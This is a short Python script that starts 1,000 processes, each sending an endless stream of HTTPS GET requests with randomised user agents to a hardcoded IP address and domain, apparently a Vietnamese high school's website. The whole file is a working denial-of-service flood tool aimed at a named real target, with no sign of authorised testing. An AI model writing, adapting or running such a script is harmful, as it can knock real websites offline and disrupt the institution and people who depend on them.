import signal
import ssl
import socket
from multiprocessing import Process, freeze_support
import requests
import time
import os
import json
import random
from threading import Thread
import traceback

stop = False

file1 = open('user-agents.txt', 'r')
Lines = file1.readlines()

domain = "thptphuongnam.edu.vn"
ip = "103.110.86.152"
prams = "/"


def run(id):
  while True:
    try:
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        start = time.time()
        s.settimeout(5)
        s.connect((ip, 443))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=domain)
        senddata = f"GET {prams} HTTP/1.1\r\nHost: {domain}\r\nConnection: close\r\nUser-Agent: {random.choice(Lines).strip()}\r\n\r\n"
        s.sendall(senddata.encode('utf-8'))
        end = time.time()
        data = s.recv()
        status = data.split(b'\r\n')[0].decode('utf-8').replace("HTTP/1.1 ", "")
        print(status + " | " + str(round(end - start, 2)) + "s" + " |  task " + str(id))
    except TimeoutError:
        print(f"Task {id} Timeout")
    except Exception:
      traceback.print_exc()


if __name__ == '__main__':
  freeze_support()
  print("Creating Task ...")
  for i in range(1000):
    Process(target=run, args=(i, )).start()


